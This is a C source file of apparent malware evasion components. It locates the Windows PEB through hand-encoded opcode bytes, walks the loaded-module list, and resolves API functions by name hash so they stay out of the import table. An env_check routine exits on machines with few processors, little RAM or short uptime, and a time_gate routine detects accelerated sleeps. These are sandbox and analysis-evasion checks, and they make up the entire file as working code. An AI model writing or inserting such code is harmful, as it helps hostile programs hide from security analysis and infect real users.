#include <stdint.h>

static uint32_t calc_hash(const char* s) {
    uint32_t h = 5381;
    while (*s) { h = ((h << 5) + h) + (uint8_t)*s++; }
    return h;
}

static uint32_t calc_hash_w(const uint16_t* s, int blen) {
    uint32_t h = 5381;
    for (int i = 0; i < blen / 2; i++) {
        uint8_t c = (uint8_t)s[i];
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

static void* get_base_ref(void) {
    void* r;
    __asm__ __volatile__(
        ".byte 0x65,0x48,0x8B,0x04,0x25,0x60,0x00,0x00,0x00\n\t"
        : "=a"(r) : : "memory"
    );
    return r;
}

static void* find_mod(uint32_t mh) {
    uint8_t* p = (uint8_t*)get_base_ref();
    if (!p) return 0;
    uint8_t* ld = *(uint8_t**)(p + 0x18);
    if (!ld) return 0;
    uint8_t* hd = ld + 0x20;
    uint8_t* en = *(uint8_t**)hd;
    while (en != hd) {
        void*     db = *(void**)(en + 0x20);
        uint16_t  nl = *(uint16_t*)(en + 0x48);
        uint16_t* nb = *(uint16_t**)(en + 0x50);
        if (db && nb && nl > 0) {
            if (calc_hash_w(nb, nl) == mh) return db;
        }
        en = *(uint8_t**)en;
    }
    return 0;
}

static void* find_fn(void* mb, uint32_t fh) {
    uint8_t* b = (uint8_t*)mb;
    int32_t pe = *(int32_t*)(b + 0x3C);
    uint8_t* nh = b + pe;
    if (*(uint32_t*)nh != 0x00004550) return 0;
    uint32_t erva = *(uint32_t*)(nh + 0x88);
    if (!erva) return 0;
    uint8_t* ed = b + erva;
    uint32_t nn = *(uint32_t*)(ed + 0x18);
    uint32_t* fa = (uint32_t*)(b + *(uint32_t*)(ed + 0x1C));
    uint32_t* na = (uint32_t*)(b + *(uint32_t*)(ed + 0x20));
    uint16_t* oa = (uint16_t*)(b + *(uint32_t*)(ed + 0x24));
    for (uint32_t i = 0; i < nn; i++) {
        if (calc_hash((const char*)(b + na[i])) == fh)
            return b + fa[oa[i]];
    }
    return 0;
}

void* resolve_api(uint32_t mh, uint32_t fh) {
    void* m = find_mod(mh);
    if (!m) return 0;
    return find_fn(m, fh);
}

typedef struct { uint16_t a; uint16_t b; uint32_t c;
    void *d, *e; uint64_t f; uint32_t g; } SI_T;
typedef struct { uint32_t len; uint32_t load;
    uint64_t tp, ap, tpf, apf, tv, av, ae; } MS_T;

int env_check(uint32_t kh, uint32_t h_gsi, uint32_t h_gms, uint32_t h_gtc) {
    typedef void (__attribute__((stdcall)) *fn_gsi)(SI_T*);
    typedef int  (__attribute__((stdcall)) *fn_gms)(MS_T*);
    typedef uint64_t (__attribute__((stdcall)) *fn_gtc)(void);

    fn_gsi f1 = (fn_gsi)resolve_api(kh, h_gsi);
    fn_gms f2 = (fn_gms)resolve_api(kh, h_gms);
    fn_gtc f3 = (fn_gtc)resolve_api(kh, h_gtc);
    if (!f1 || !f2 || !f3) return 1;

    SI_T si; f1(&si);
    if (si.g < 2) return 0;

    MS_T ms; ms.len = sizeof(ms); f2(&ms);
    if (ms.tp < 2ULL * 1024 * 1024 * 1024) return 0;

    if (f3() < 1200000) return 0;
    return 1;
}

int time_gate(uint32_t kh, uint32_t h_gtc, uint32_t h_slp, uint32_t ms) {
    typedef uint64_t (__attribute__((stdcall)) *fn_gtc)(void);
    typedef void     (__attribute__((stdcall)) *fn_slp)(uint32_t);

    fn_gtc f1 = (fn_gtc)resolve_api(kh, h_gtc);
    fn_slp f2 = (fn_slp)resolve_api(kh, h_slp);
    if (!f1 || !f2) return 1;

    uint64_t t0 = f1();
    f2(ms);
    uint64_t t1 = f1();
    if ((t1 - t0) < (uint64_t)(ms * 80 / 100)) return 0;
    return 1;
}
